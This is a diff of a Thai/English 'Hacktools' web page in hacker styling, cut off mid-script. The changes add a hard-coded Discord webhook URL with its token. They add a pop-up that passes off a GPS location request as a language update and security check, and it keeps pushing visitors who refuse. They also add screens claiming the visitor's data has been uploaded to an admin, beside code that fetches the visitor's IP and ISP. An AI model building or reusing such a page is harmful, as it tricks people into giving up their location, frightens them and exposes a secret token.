@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hacktools</title>
+    <title>Hacktools | Surveillance System</title>
     <link rel="icon" href="https://www.shareicon.net/data/2015/09/10/99088_man_512x512.png" type="image/png">
     
     <link href="https://fonts.googleapis.com/css2?family=Kanit:wght@300;400;600&family=VT323&display=swap" rel="stylesheet">
@@ -13,9 +13,9 @@
         :root {
             --neon: #00ff00;
             --danger: #ff0000;
-            --glass: rgba(0, 20, 0, 0.85);
+            --warning: #ffcc00;
+            --glass: rgba(0, 15, 0, 0.95);
             --border: 1px solid var(--neon);
-            --blur: blur(8px);
         }
 
         body {
@@ -29,119 +29,122 @@
         /* Matrix Background */
         canvas { position: fixed; top: 0; left: 0; z-index: 0; }
 
-        /* --- Loader --- */
+        /* --- Floating Creators (Low & Sync) --- */
+        #creators-layer { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; pointer-events: none; }
+        .creator-bubble { position: absolute; bottom: -200px; display: flex; flex-direction: column; align-items: center; opacity: 0.9; }
+        .c-img { width: 80px; height: 80px; border-radius: 50%; border: 3px solid var(--neon); box-shadow: 0 0 20px var(--neon); object-fit: cover; background: #000; }
+        .c-name { background: #000; color: var(--neon); padding: 4px 10px; border-radius: 10px; border: 1px solid var(--neon); margin-top: 5px; font-size: 0.9rem; font-family: 'Kanit'; text-shadow: 0 0 5px var(--neon); }
+        
+        /* Synchronized Animation */
+        .float-1 { left: 20%; animation: floatDrop 8s infinite ease-in-out; }
+        .float-2 { right: 20%; animation: floatDrop 8s infinite ease-in-out; } /* No Delay */
+        
+        @keyframes floatDrop {
+            0% { bottom: -150px; opacity: 0; transform: scale(0.8); }
+            20% { opacity: 1; }
+            50% { bottom: 15%; opacity: 1; transform: scale(1.1); } /* Max height ~15% of screen (Low) */
+            55% { bottom: 15%; opacity: 1; }
+            100% { bottom: -150px; opacity: 0; transform: scale(0.5); }
+        }
+
+        /* --- 64x64 X Loader --- */
         #loader {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: #000; z-index: 9999; display: flex; flex-direction: column;
-            justify-content: center; align-items: center;
+            justify-content: center; align-items: center; transition: opacity 0.5s;
         }
-        .lego-grid { display: grid; grid-template-columns: repeat(8, 25px); gap: 2px; }
-        .pixel { width: 25px; height: 25px; background: #111; transition: 0.1s; }
-        .pixel.active { background: var(--neon); box-shadow: 0 0 15px var(--neon); }
+        .mask-grid {
+            display: grid; grid-template-columns: repeat(64, 4px); 
+            grid-template-rows: repeat(64, 4px); gap: 1px;
+            transition: transform 0.5s;
+        }
+        .pixel { width: 4px; height: 4px; background: #050505; transition: background 0.05s; }
+        .pixel.active { background: var(--neon); box-shadow: 0 0 5px var(--neon); }
+        
+        .intro-finish { animation: studioFlash 0.5s ease-out forwards; }
+        @keyframes studioFlash {
+            0% { transform: scale(1); filter: brightness(1); }
+            50% { transform: scale(1.2); filter: brightness(2); box-shadow: 0 0 50px var(--neon); }
+            100% { transform: scale(1.5); opacity: 0; }
+        }
 
         /* --- Navbar --- */
         .navbar {
             position: fixed; top: 0; width: 100%; height: 70px;
             display: flex; justify-content: space-between; align-items: center;
-            padding: 0 30px; z-index: 1000; background: rgba(0,0,0,0.8);
+            padding: 0 30px; z-index: 1000; background: rgba(0,0,0,0.95);
             border-bottom: 2px solid var(--neon); box-sizing: border-box;
         }
-        .nav-left { font-size: 1.8rem; letter-spacing: 2px; text-shadow: 0 0 5px var(--neon); }
+        .nav-left { font-size: 1.8rem; letter-spacing: 2px; text-shadow: 0 0 10px var(--neon); }
         .nav-right { display: flex; align-items: center; gap: 20px; position: relative; }
-
         .profile-box { display: flex; align-items: center; gap: 10px; }
         .profile-img { width: 45px; height: 45px; border-radius: 50%; border: 2px solid var(--neon); }
+        .status-badge { font-size: 0.8rem; color: #aaa; }
 
-        /* --- Language Dropdown --- */
-        .lang-dropdown {
-            position: relative;
-            display: inline-block;
-            font-family: 'Kanit', sans-serif;
-        }
-        .lang-btn {
-            background: rgba(0, 0, 0, 0.8);
-            color: var(--neon);
-            border: 1px solid var(--neon);
-            padding: 8px 15px;
-            font-size: 16px;
-            cursor: pointer;
-            border-radius: 5px;
-            display: flex; align-items: center; gap: 10px;
-            transition: 0.3s; min-width: 100px; justify-content: space-between;
-        }
-        .lang-btn:hover { background: rgba(0, 255, 0, 0.2); box-shadow: 0 0 10px var(--neon); }
-        .lang-content {
-            display: none; position: absolute; background-color: #000;
-            min-width: 100%; box-shadow: 0 0 15px rgba(0,255,0,0.5);
-            border: 1px solid var(--neon); z-index: 1; margin-top: 5px;
-            border-radius: 5px;
-        }
-        .lang-content div {
-            color: var(--neon); padding: 10px; text-decoration: none;
-            display: block; cursor: pointer; transition: 0.2s; text-align: center;
-        }
+        /* Lang Dropdown */
+        .lang-dropdown { position: relative; display: inline-block; font-family: 'Kanit', sans-serif; }
+        .lang-btn { background: rgba(0, 20, 0, 0.8); color: var(--neon); border: 1px solid var(--neon); padding: 8px 15px; font-size: 16px; cursor: pointer; border-radius: 5px; display: flex; align-items: center; gap: 10px; min-width: 110px; justify-content: space-between; }
+        .lang-content { display: none; position: absolute; background-color: #000; min-width: 100%; box-shadow: 0 0 15px rgba(0,255,0,0.5); border: 1px solid var(--neon); z-index: 1; margin-top: 5px; border-radius: 5px; }
+        .lang-content div { color: var(--neon); padding: 10px; cursor: pointer; text-align: center; }
         .lang-content div:hover { background-color: var(--neon); color: #000; }
-        .show { display: block; animation: slideDown 0.3s ease; }
-        @keyframes slideDown { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
+        .show { display: block; }
+
+        /* --- Language Hint Bubble --- */
+        .lang-hint-box {
+            position: fixed; top: 85px; right: 20px;
+            background: var(--neon); color: #000;
+            padding: 10px 15px; border-radius: 8px;
+            font-family: 'Kanit'; font-weight: 600; font-size: 0.9rem;
+            z-index: 2000; animation: bounceHint 2s infinite;
+            box-shadow: 0 0 15px var(--neon); pointer-events: none;
+        }
+        .lang-hint-box::after {
+            content: ''; position: absolute; top: -8px; right: 45px;
+            border-left: 8px solid transparent;
+            border-right: 8px solid transparent;
+            border-bottom: 8px solid var(--neon);
+        }
+        @keyframes bounceHint {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(10px); }
+        }
 
         /* --- Main UI --- */
-        .container {
-            position: relative; z-index: 10; height: 100vh; display: flex;
-            justify-content: center; align-items: center; flex-direction: column; width: 100%;
-        }
-        .glass-box {
-            background: var(--glass); backdrop-filter: var(--blur);
-            border: var(--border); padding: 40px; border-radius: 20px;
-            text-align: center; max-width: 90%; width: 500px;
-            box-shadow: 0 0 30px rgba(0, 255, 0, 0.15);
-            position: relative;
-        }
+        .container { position: relative; z-index: 10; height: 100vh; display: flex; justify-content: center; align-items: center; flex-direction: column; width: 100%; }
+        .glass-box { background: var(--glass); backdrop-filter: blur(12px); border: var(--border); padding: 40px; border-radius: 20px; text-align: center; max-width: 90%; width: 550px; box-shadow: 0 0 30px rgba(0, 255, 0, 0.2); position: relative; animation: pulseBorder 4s infinite; }
+        @keyframes pulseBorder { 0%,100% { border-color: var(--neon); } 50% { border-color: rgba(0,255,0,0.3); } }
 
-        /* Elements */
-        .danger-mode { border-color: var(--danger) !important; box-shadow: 0 0 30px var(--danger) !important; }
-        .text-danger { color: var(--danger) !important; text-shadow: 0 0 5px var(--danger); }
+        .danger-mode { border-color: var(--danger) !important; box-shadow: 0 0 40px var(--danger) !important; }
+        .text-danger { color: var(--danger) !important; text-shadow: 0 0 10px var(--danger); }
+        .warning-mode { border-color: var(--warning) !important; box-shadow: 0 0 40px var(--warning) !important; }
+        .text-warning { color: var(--warning) !important; font-family: 'Kanit'; }
+
+        .hacker-input { background: #000; border: none; border-bottom: 2px solid var(--neon); color: var(--neon); width: 100%; font-size: 1.5rem; text-align: center; padding: 10px; margin-top: 15px; outline: none; font-family: 'VT323'; }
         
-        .hacker-input {
-            background: #000; border: none; border-bottom: 2px solid var(--neon);
-            color: var(--neon); width: 100%; font-size: 1.5rem; text-align: center;
-            padding: 10px; margin-top: 15px; outline: none; font-family: 'VT323';
-        }
-        
-        .btn-hack {
-            margin-top: 20px; padding: 12px 30px; font-size: 1.2rem;
-            background: rgba(0, 255, 0, 0.1); border: 1px solid var(--neon); color: var(--neon);
-            cursor: pointer; transition: 0.3s; font-family: 'Kanit'; width: 100%;
-        }
-        .btn-hack:hover { background: var(--neon); color: #000; box-shadow: 0 0 20px var(--neon); }
-        .btn-red { border-color: var(--danger); color: var(--danger); background: rgba(255,0,0,0.1); }
-        .btn-red:hover { background: var(--danger); color: #fff; box-shadow: 0 0 20px var(--danger); }
+        .btn-hack { margin-top: 20px; padding: 12px 30px; font-size: 1.2rem; background: rgba(0, 50, 0, 0.3); border: 1px solid var(--neon); color: var(--neon); cursor: pointer; transition: 0.3s; font-family: 'Kanit'; width: 100%; border-radius: 10px; }
+        .btn-hack:hover { background: var(--neon); color: #000; box-shadow: 0 0 25px var(--neon); font-weight: bold; }
+        .btn-red { border-color: var(--danger); color: var(--danger); background: rgba(50,0,0,0.3); }
+        .btn-red:hover { background: var(--danger); color: #fff; box-shadow: 0 0 25px var(--danger); }
+        .btn-warn { border-color: var(--warning); color: var(--warning); background: rgba(50,50,0,0.3); }
+        .btn-warn:hover { background: var(--warning); color: #000; }
+
+        /* Captcha Math Grid */
+        .math-options { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-top: 20px; }
+        .math-btn { padding: 15px; border: 1px solid var(--neon); background: #000; color: var(--neon); font-size: 1.2rem; cursor: pointer; transition: 0.3s; }
+        .math-btn:hover { background: var(--neon); color: #000; }
 
         /* Dashboard App Grid */
-        .app-grid {
-            display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); 
-            gap: 20px; width: 100%; margin-top: 30px;
-        }
-        .app-card {
-            border: 1px solid var(--neon); background: rgba(0, 50, 0, 0.6);
-            padding: 20px; border-radius: 15px; cursor: pointer; transition: 0.3s;
-            display: flex; flex-direction: column; align-items: center; justify-content: center;
-        }
-        .app-card:hover { transform: scale(1.05); background: rgba(0, 255, 0, 0.3); box-shadow: 0 0 20px var(--neon); }
-        .app-soon { border-color: yellow; color: yellow; opacity: 0.5; cursor: not-allowed; }
+        .app-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 20px; width: 100%; margin-top: 30px; }
+        .app-card { border: 1px solid var(--neon); background: rgba(0, 40, 0, 0.7); padding: 20px; border-radius: 15px; cursor: pointer; transition: 0.3s; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        .app-card:hover { transform: translateY(-5px); background: rgba(0, 255, 0, 0.2); box-shadow: 0 0 20px var(--neon); }
+        .app-soon { border-color: #ffd700; color: #ffd700; opacity: 0.5; cursor: not-allowed; }
 
-        /* Result Modal */
-        .cookie-box {
-            width: 100%; height: 100px; background: #000; border: 1px solid var(--neon);
-            color: var(--neon); font-size: 0.8rem; word-break: break-all; overflow-y: scroll;
-            margin-top: 10px; padding: 5px; resize: none;
-        }
-
-        /* Overlays */
-        .modal-overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.95); z-index: 5000; display: flex;
-            justify-content: center; align-items: center;
-        }
+        .cookie-box { width: 100%; height: 100px; background: #000; border: 1px solid var(--neon); color: var(--neon); font-size: 0.8rem; word-break: break-all; overflow-y: scroll; margin-top: 10px; padding: 5px; resize: none; }
+        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 5000; display: flex; justify-content: center; align-items: center; }
+        .upload-anim { font-size: 1.5rem; color: var(--danger); animation: blink 0.5s infinite; }
+        @keyframes blink { 0%,100% { opacity: 1; } 50% { opacity: 0.3; } }
+        .shake { animation: shake 0.5s; }
+        @keyframes shake { 0% { transform: translate(1px, 1px) rotate(0deg); } 10% { transform: translate(-1px, -2px) rotate(-1deg); } 20% { transform: translate(-3px, 0px) rotate(1deg); } 30% { transform: translate(3px, 2px) rotate(0deg); } 40% { transform: translate(1px, -1px) rotate(1deg); } 50% { transform: translate(-1px, 2px) rotate(-1deg); } 60% { transform: translate(-3px, 1px) rotate(0deg); } 70% { transform: translate(3px, 1px) rotate(-1deg); } 80% { transform: translate(-1px, -1px) rotate(1deg); } 90% { transform: translate(1px, 2px) rotate(0deg); } 100% { transform: translate(1px, -2px) rotate(-1deg); } }
 
     </style>
 </head>
@@ -152,16 +155,30 @@
 
     <canvas id="matrix"></canvas>
 
+    <div id="creators-layer">
+        <div class="creator-bubble float-1">
+            <img src="profile1.jpg" class="c-img">
+            <div class="c-name">Rachapol Kew</div>
+        </div>
+        <div class="creator-bubble float-2">
+            <img src="profile2.jpg" class="c-img">
+            <div class="c-name">TonoKhomchan</div>
+        </div>
+    </div>
+
     <div id="loader">
-        <div class="lego-grid" id="lego-mask"></div>
-        <p class="code" style="margin-top:20px; letter-spacing:5px; font-size:1.5rem;">SYSTEM LOADING...</p>
+        <div class="mask-grid" id="mask-grid"></div>
+        <p class="code" style="margin-top:20px; letter-spacing:5px; font-size:2rem; text-shadow: 0 0 10px #0f0;">Hacker Studios</p>
     </div>
 
     <div class="navbar hidden" id="nav">
         <div class="nav-left code">Hacktools</div>
         <div class="nav-right">
             <div id="nav-profile" class="profile-box hidden">
-                <span class="code">@anonymous</span>
+                <div style="text-align:right;">
+                    <div class="code" style="line-height:1;">@anonymous</div>
+                    <div class="status-badge code" style="color:var(--neon);">• Active Now</div>
+                </div>
                 <img src="https://www.shareicon.net/data/2015/09/10/99088_man_512x512.png" class="profile-img">
             </div>
             
@@ -178,49 +195,81 @@
         </div>
     </div>
 
+    <div id="lang-hint" class="lang-hint-box hidden">
+        สามารถเปลี่ยนภาษาได้ <i class="fas fa-arrow-up"></i>
+    </div>
+
     <div id="intro-modal" class="modal-overlay" style="z-index: 2000;">
         <div class="glass-box" style="border-color: #fff;">
-            <i class="fas fa-user-secret" style="font-size:3rem; margin-bottom:15px;"></i>
-            <h2 class="kanit" data-t="intro_h">ยืนยันตัวตนแฮกเกอร์</h2>
-            <p class="kanit" data-t="intro_p">เรามีระบบเปลี่ยนภาษาอัปเดตใหม่ โปรดยืนยันข้อมูลของคุณเพื่อยอมรับเงื่อนไขและเข้าร่วมเป็นแฮกเกอร์กับเรา</p>
-            <button class="btn-hack" onclick="acceptIntro()" data-t="intro_btn">ยอมรับและเข้าร่วม</button>
+            <i class="fas fa-satellite-dish" style="font-size:3rem; margin-bottom:15px; color:#fff;"></i>
+            <h2 class="kanit" data-t="intro_h">อัปเดตระบบ & ยืนยันตัวตน</h2>
+            <p class="kanit" data-t="intro_p" style="font-size:1.1rem; line-height:1.6;">
+                1. เรามีระบบภาษาใหม่เพื่อความสะดวก<br>
+                2. เพื่ออรรถรสในการใช้งาน โปรดกด <b>"อนุญาต (Allow)"</b> ตำแหน่ง<br>
+                เพื่อให้เราตรวจสอบความปลอดภัยของคุณ
+            </p>
+            <button class="btn-hack" onclick="requestPermission()" data-t="intro_btn">ยอมรับและเปิดใช้งาน</button>
+        </div>
+    </div>
+
+    <div id="warning-modal" class="modal-overlay hidden" style="z-index: 2100;">
+        <div class="glass-box warning-mode">
+            <i class="fas fa-exclamation-triangle" style="font-size:3rem; margin-bottom:15px; color:var(--warning);"></i>
+            <h2 class="text-warning">แน่ใจหรือไม่?</h2>
+            <p class="kanit" style="color:#fff; font-size:1.1rem;">
+                หากคุณไม่เปิดตำแหน่ง ฟีเจอร์บางอย่างอาจทำงานไม่ครบถ้วน<br>
+                ระบบต้องการพิกัดเพื่อความสมบูรณ์ของระบบแฮก
+            </p>
+            <button class="btn-hack btn-warn" onclick="forceRetry()" style="margin-bottom:10px;">ลองใหม่อีกครั้ง</button>
+            <div style="font-size:0.9rem; color:#aaa; cursor:pointer; text-decoration:underline;" onclick="skipToHome()">ดำเนินการต่อโดยไม่เปิดตำแหน่ง</div>
         </div>
     </div>
 
     <div id="pg-home" class="container hidden">
         <div class="glass-box">
-            <img src="https://www.shareicon.net/data/2015/09/10/99088_man_512x512.png" class="profile-img" style="width:100px; height:100px; box-shadow: 0 0 20px var(--neon);">
-            <h1 class="code" style="font-size:3rem; margin:15px 0;">ANONYMOUS</h1>
-            <p class="kanit" data-t="home_desc">ยินดีต้อนรับสู่เครือข่ายใต้ดิน</p>
-            <button class="btn-hack kanit" onclick="goHacked()" data-t="home_login">
+            <img src="https://www.shareicon.net/data/2015/09/10/99088_man_512x512.png" class="profile-img" style="width:120px; height:120px; box-shadow: 0 0 20px var(--neon);">
+            <h1 class="code" style="font-size:3.5rem; margin:20px 0; letter-spacing: 5px;">ANONYMOUS</h1>
+            <p class="kanit" data-t="home_desc" style="font-size:1.2rem;">ยินดีต้อนรับสู่เครือข่ายใต้ดิน</p>
+            <button class="btn-hack kanit" onclick="goHacked()" data-t="home_login" style="font-weight:bold; font-size:1.3rem;">
                 เข้าสู่ระบบแบบไม่ระบุตัวตน
             </button>
         </div>
         <div style="position:fixed; bottom:20px; opacity:0.7;" class="kanit">ต่อต้าน FBI</div>
     </div>
 
+    <div id="pg-upload" class="container hidden">
+        <div class="upload-anim code">UPLOADING DATA TO ADMIN...</div>
+        <div style="width:300px; height:5px; background:#333; margin-top:10px;">
+            <div id="upload-bar" style="width:0%; height:100%; background:var(--danger); transition: 2s;"></div>
+        </div>
+    </div>
+
     <div id="pg-hacked" class="container hidden">
-        <div class="glass-box danger-mode" style="width:600px;">
+        <div class="glass-box danger-mode" style="width:650px;">
             <h2 class="code text-danger" style="font-size:2.5rem;" data-t="hack_h">SYSTEM COMPROMISED</h2>
-            <p class="kanit text-danger" data-t="hack_warn">⚠️ ข้อมูลของคุณอยู่กับเราแล้ว! หากข้อมูลหลุด คุณต้องรับผิดชอบ</p>
+            <p class="kanit text-danger" data-t="hack_warn" style="font-size:1.1rem;">⚠️ ข้อมูลของคุณถูกส่งไปที่ Admin แล้ว! ห้ามปิดหน้าต่าง</p>
             
-            <div id="user-data" class="kanit" style="text-align:left; margin:20px 0; border-left:3px solid red; padding-left:15px; line-height:1.5;">
+            <div id="user-data" class="kanit" style="text-align:left; margin:20px 0; border-left:4px solid red; padding-left:20px; line-height:1.6; font-size:1.1rem; background:rgba(0,0,0,0.5); padding:15px;">
                 Fetching Data...
             </div>
             
-            <div id="map-area" style="width:100%; height:150px; background:#111; border:1px solid red; margin-bottom:15px;"></div>
+            <div id="map-area" style="width:100%; height:200px; background:#111; border:1px solid red; margin-bottom:20px;"></div>
             
             <p class="kanit" data-t="enter_code">กรอกรหัสลับองค์กร:</p>
-            <input type="text" id="secret-code" class="hacker-input" style="border-color:red; color:red;" placeholder="CODE">
+            <input type="text" id="secret-code" class="hacker-input" style="border-color:red; color:red;" placeholder="ACCESS CODE">
         </div>
     </div>
 
     <div id="pg-captcha" class="container hidden">
-        <div class="glass-box">
-            <h2 class="kanit" data-t="cap_h">เป็นไปได้ยังไง?</h2>
-            <div style="border:1px solid var(--neon); padding:20px; margin-top:20px; display:inline-block; cursor:pointer;" onclick="passCaptcha()">
-                <input type="checkbox"> <span class="kanit" data-t="cap_lbl">ฉันไม่ใช่โปรแกรมอัตโนมัติ</span>
+        <div class="glass-box" id="captcha-box">
+            <h2 class="kanit" style="color:var(--neon);">ยืนยันว่าคุณคือมนุษย์</h2>
+            <p class="kanit" style="margin-top:10px;">จงหาคำตอบของสมการ:</p>
+            <div style="font-size:1.5rem; margin:15px 0; color:#fff; font-family:'Times New Roman', serif; border:1px dashed #555; padding:10px;">
+                ∫ (3x² + e⁻ˣ) dx | lim(x→∞)
             </div>
+            
+            <div class="math-options" id="math-options">
+                </div>
         </div>
     </div>
 
@@ -229,19 +278,19 @@
             <h2 class="kanit" data-t="dash_h">ศูนย์ควบคุม</h2>
             <div class="app-grid">
                 <div class="app-card" onclick="openRoblox()">
-                    <i class="fas fa-gamepad" style="font-size:3rem; margin-bottom:10px;"></i>
+                    <i class="fas fa-gamepad" style="font-size:3.5rem; margin-bottom:10px;"></i>
                     <h3 class="code">ROBLOX</h3>
                 </div>
                 <div class="app-card app-soon">
-                    <i class="fab fa-facebook" style="font-size:3rem; margin-bottom:10px;"></i>
+                    <i class="fab fa-facebook" style="font-size:3.5rem; margin-bottom:10px;"></i>
                     <h3 class="code">FACEBOOK</h3>
                 </div>
                 <div class="app-card app-soon">
-                    <i class="fab fa-instagram" style="font-size:3rem; margin-bottom:10px;"></i>
+                    <i class="fab fa-instagram" style="font-size:3.5rem; margin-bottom:10px;"></i>
                     <h3 class="code">INSTAGRAM</h3>
                 </div>
                 <div class="app-card app-soon">
-                    <i class="fab fa-line" style="font-size:3rem; margin-bottom:10px;"></i>
+                    <i class="fab fa-line" style="font-size:3.5rem; margin-bottom:10px;"></i>
                     <h3 class="code">LINE</h3>
                 </div>
             </div>
@@ -269,25 +318,26 @@
     </div>
 
     <script>
-        // --- Config & Data ---
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1463153197815300117/Ljc-NOI-XwJA3poOTNCPfuUNM1V7xSPwvhAcc9yk4cndBt166FhvwXEPu5HmTfMlnBTj";
+
         const txt = {
             th: {
-                intro_h: "ยืนยันตัวตนแฮกเกอร์", 
-                intro_p: "เรามีระบบเปลี่ยนภาษาอัปเดตใหม่ โปรดยืนยันข้อมูลของคุณเพื่อยอมรับเงื่อนไขและเข้าร่วมเป็นแฮกเกอร์กับเรา", 
-                intro_btn: "ยอมรับและเข้าร่วม",
+                intro_h: "อัปเดตระบบ & ยืนยันตัวตน", 
+                intro_p: "1. เรามีระบบภาษาใหม่เพื่อความสะดวก<br>2. เพื่ออรรถรสในการใช้งาน โปรดกด <b>'อนุญาต (Allow)'</b> ตำแหน่ง<br>เพื่อให้เราตรวจสอบความปลอดภัยของคุณ", 
+                intro_btn: "ยอมรับและเปิดใช้งาน",
                 home_desc: "ยินดีต้อนรับสู่เครือข่ายใต้ดิน", home_login: "เข้าสู่ระบบแบบไม่ระบุตัวตน",
-                hack_h: "ระบบถูกเจาะสมบูรณ์", hack_warn: "⚠️ ข้อมูลของคุณอยู่กับเราแล้ว! หากข้อมูลหลุด คุณต้องรับผิดชอบ", enter_code: "กรอกรหัสลับองค์กร:",
+                hack_h: "ระบบถูกเจาะสมบูรณ์", hack_warn: "⚠️ ข้อมูลของคุณถูกส่งไปที่ Admin แล้ว! ห้ามปิดหน้าต่าง", enter_code: "กรอกรหัสลับองค์กร:",
                 cap_h: "เป็นไปได้ยังไง?", cap_lbl: "ฉันไม่ใช่โปรแกรมอัตโนมัติ",
                 dash_h: "ศูนย์ควบคุม",
                 rbx_warn: "ระบบจะทำงานเมื่อบัญชีนี้เคยถูกแฮกมาก่อน", rbx_btn: "เริ่มโจมตี",
                 res_suc_h: "ตรวจพบว่าเคยถูกแฮก", res_fail_h: "บัญชีนี้ปลอดภัย", res_fail_p: "บัญชีนี้ไม่เคยตกเป็นเหยื่อ",
             },
             en: {
-                intro_h: "Hacker Identity Verification", 
-                intro_p: "We have updated the language system. Please verify your data to accept terms and join us as a hacker.", 
-                intro_btn: "Accept & Join",
+                intro_h: "System Update & Identity Verify", 
+                intro_p: "1. New language system updated.<br>2. For best experience, please <b>'Allow'</b> location access<br>so we can verify your security.", 
+                intro_btn: "Accept & Enable",
                 home_desc: "Welcome to the Underground", home_login: "Login Anonymous",
-                hack_h: "SYSTEM COMPROMISED", hack_warn: "⚠️ Your data is with us! You are responsible for any leaks.", enter_code: "Enter Secret Code:",
+                hack_h: "SYSTEM COMPROMISED", hack_warn: "⚠️ Your data has been uploaded to Admin! Do not close.", enter_code: "Enter Secret Code:",
                 cap_h: "How is this possible?", cap_lbl: "I am not a robot",
                 dash_h: "Control Center",
                 rbx_warn: "System works only if account was hacked before.", rbx_btn: "Start Attack",
@@ -297,236 +347,240 @@
 
         let lang = 'th';
         const audios = { bg: document.getElementById('bgm'), danger: document.getElementById('danger-sfx') };
-        let ipCache = null; // Store basic IP data
+        let ipCache = null;
+        let gpsData = null;
 
-        // --- Core Functions ---
-
-        // Loader 1 sec
+        // --- 64x64 X LOADER LOGIC ---
         function loading(callback) {
             const l = document.getElementById('loader');
-            const mask = document.getElementById('lego-mask');
+            const mask = document.getElementById('mask-grid');
             l.classList.remove('hidden');
             mask.innerHTML = '';
             
-            for(let i=0; i<32; i++){
+            const size = 64;
+            for(let i=0; i<size*size; i++) {
                 let d = document.createElement('div');
                 d.className = 'pixel';
                 mask.appendChild(d);
             }
 
-            let idx = 0;
-            let pixels = document.querySelectorAll('.pixel');
-            let timer = setInterval(() => {
-                if(idx < pixels.length) {
-                    pixels[idx].classList.add('active');
-                    idx++;
-                } else {
-                    clearInterval(timer);
+            const pixels = document.querySelectorAll('.pixel');
+            
+            // Draw Big X
+            for(let i=0; i<size*size; i++) {
+                const x = i % size;
+                const y = Math.floor(i / size);
+                // Diagonal check for X shape
+                if (Math.abs(x - y) < 2 || Math.abs(x + y - (size-1)) < 2) {
                     setTimeout(() => {
-                        l.classList.add('hidden');
-                        if(callback) callback();
-                    }, 200); 
+                        if(pixels[i]) pixels[i].classList.add('active');
+                    }, Math.random() * 800);
                 }
-            }, 20); 
+            }
+
+            setTimeout(() => { 
+                mask.classList.add('intro-finish'); // Flash
+                setTimeout(() => {
+                    l.classList.add('hidden');
+                    mask.classList.remove('intro-finish'); 
+                    if(callback) callback();
+                }, 500); 
+            }, 1500); 
         }
 
         window.onload = () => { 
             loading(() => { 
-                document.getElementById('nav').classList.remove('hidden');
+                document.getElementById('nav').classList.remove('hidden'); 
+                document.getElementById('lang-hint').classList.remove('hidden');
             }); 
             updateText(); 
-            // Pre-fetch basic IP for fallback
             fetch('https://ipapi.co/json/').then(r=>r.json()).then(data => ipCache = data);
         };
 
-        // --- Dropdown Logic ---
-        function toggleDropdown() {
+        function toggleDropdown() { 
             document.getElementById("lang-list").classList.toggle("show");
+            document.getElementById('lang-hint').classList.add('hidden');
         }
-
         function changeLang(selected) {
-            lang = selected;
-            updateText();
-            const btnText = selected === 'th' ? '<i class="fas fa-flag"></i> TH' : '<i class="fas fa-globe"></i> EN';
-            document.getElementById("current-lang").innerHTML = btnText;
+            lang = selected; updateText();
+            document.getElementById("current-lang").innerHTML = selected === 'th' ? '<i class="fas fa-flag"></i> TH' : '<i class="fas fa-globe"></i> EN';
             document.getElementById("lang-list").classList.remove("show");
         }
+        window.onclick = function(e) { if(!e.target.matches('.lang-btn') && !e.target.matches('.lang-btn *')) document.getElementById("lang-list").classList.remove("show"); }
+        function updateText() { document.querySelectorAll('[data-t]').forEach(el => { el.innerHTML = txt[lang][el.getAttribute('data-t')]; }); }
 
-        window.onclick = function(event) {
-            if (!event.target.matches('.lang-btn') && !event.target.matches('.lang-btn *')) {
-                var dropdowns = document.getElementsByClassName("lang-content");
-                for (var i = 0; i < dropdowns.length; i++) {
-                    var openDropdown = dropdowns[i];
-                    if (openDropdown.classList.contains('show')) {
-                        openDropdown.classList.remove('show');
-                    }
-                }
-            }
+        // --- PERMISSION LOGIC ---
+        function requestPermission() {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => { gpsData = pos; acceptIntro(); },
+                (err) => { document.getElementById('intro-modal').classList.add('hidden'); document.getElementById('warning-modal').classList.remove('hidden'); }
+            );
         }
-
-        function updateText() {
-            document.querySelectorAll('[data-t]').forEach(el => {
-                el.innerText = txt[lang][el.getAttribute('data-t')];
-            });
+        function forceRetry() {
+            document.getElementById('warning-modal').classList.add('hidden');
+            navigator.geolocation.getCurrentPosition(
+                (pos) => { gpsData = pos; acceptIntro(); },
+                (err) => { document.getElementById('warning-modal').classList.remove('hidden'); }
+            );
         }
-
+        function skipToHome() { document.getElementById('warning-modal').classList.add('hidden'); acceptIntro(); }
         function acceptIntro() {
             loading(() => {
                 document.getElementById('intro-modal').classList.add('hidden');
+                document.getElementById('warning-modal').classList.add('hidden');
                 document.getElementById('pg-home').classList.remove('hidden');
-                audios.bg.volume = 0.5;
-                audios.bg.play().catch(e=>console.log('Audio blocked'));
+                document.getElementById('lang-hint').classList.add('hidden');
+                audios.bg.volume = 0.5; audios.bg.play().catch(e=>{});
             });
         }
 
-        // --- Hacked Logic (GPS + IP) ---
+        // --- Hacked Logic ---
         function goHacked() {
-            loading(() => {
-                document.getElementById('pg-home').classList.add('hidden');
+            document.getElementById('pg-home').classList.add('hidden');
+            document.getElementById('pg-upload').classList.remove('hidden');
+            document.getElementById('nav-profile').classList.remove('hidden');
+            setTimeout(() => { document.getElementById('upload-bar').style.width = '100%'; }, 100);
+            setTimeout(() => {
+                document.getElementById('pg-upload').classList.add('hidden');
                 document.getElementById('pg-hacked').classList.remove('hidden');
-                document.getElementById('nav-profile').classList.remove('hidden');
-                
-                audios.bg.pause();
-                audios.danger.volume = 0.3;
-                audios.danger.play();
-                
-                requestGPS();
-            });
+                audios.bg.pause(); audios.danger.volume = 0.3; audios.danger.play();
+                showData();
+            }, 2000);
         }
 
-        function requestGPS() {
+        function showData() {
             const d = document.getElementById('user-data');
             const m = document.getElementById('map-area');
-            d.innerHTML = "<span style='color:yellow; animation:blink 0.5s infinite'>REQUESTING SATELLITE...</span>";
-
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        // Success GPS
-                        const lat = position.coords.latitude;
-                        const lng = position.coords.longitude;
-                        const acc = position.coords.accuracy;
-                        
-                        // Use IP cache for ISP info + GPS for Location
-                        const info = ipCache || { ip: "192.168.X.X", org: "Unknown" };
-
-                        d.innerHTML = `
-                            <span style="color:#0f0">[ GPS LOCKED ]</span><br>
